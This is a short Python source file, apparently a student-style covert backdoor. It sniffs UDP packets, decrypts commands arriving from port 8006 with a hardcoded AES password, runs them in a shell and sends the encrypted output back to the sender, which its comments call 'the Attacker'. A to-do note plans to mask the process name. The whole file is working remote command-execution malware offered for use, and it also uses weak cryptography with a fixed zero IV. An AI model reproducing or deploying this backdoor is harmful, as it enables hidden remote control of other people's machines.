#Listens for commands (sniff packets)
#Check if it is our sender
#get the payload
#Decrpyt the command
#Run Command
#Encrypt Output 
#Send to the Attacker

#STILL NEED TO DO:
#setProctile (mask process)    cannot install on my Ubuntu machine. error with: $pip install setproctitle



#link below is instructions I used for AES encryption
#http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto

from scapy.all import * 
import sys, os, subprocess
import sys, argparse, os, base64, hashlib
from Crypto import Random


key = 'P@ssw0rd'#encryption password
IV = 16 * '\x00'#16 is block size (making IV 16 bytes long)







#convert the password to a 32-byte key using the SHA-256 algorithm
def getKey():
	global key
	return hashlib.sha256(key).digest()


#IV is initialization variable. Also needs to be 16 bytes long. Did that in global variable

def decrypt(text):
	global IV
	key = getKey()
	decipher = AES.new(key, AES.MODE_CFB, IV)
	plaintext = decipher.decrypt(text)

	return plaintext


def encrypt(text):
	key = getKey()
	global IV
	
	cipher = AES.new(key, AES.MODE_CFB, IV)
	ciphertext = cipher.encrypt(text)
	
	return ciphertext














#Should come up with better way to find if it is our packet
def getCommand(packet):

	if Raw in packet[2]:
		dstPort = packet[UDP].dport
		srcPort = packet[UDP].sport
		dstIP = packet[IP].dst
		srcIP = packet[IP].src


		if srcPort == 8006:
			command = decrypt(packet[Raw].load)

			
			
			print command
			
			#Open a shell and enter our command, pipe output
			process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			output = process.stdout.read() + process.stderr.read()


			packet = IP(dst=dstIP)/UDP(dport=srcPort, sport=dstPort)/Raw(load=encrypt(output))
			send(packet)
			

		



if __name__== '__main__':
	#setproctitle.setproctitle("PROCESS_NAME")
	while True:
		sniff(filter="udp and host localhost", prn=getCommand)

	

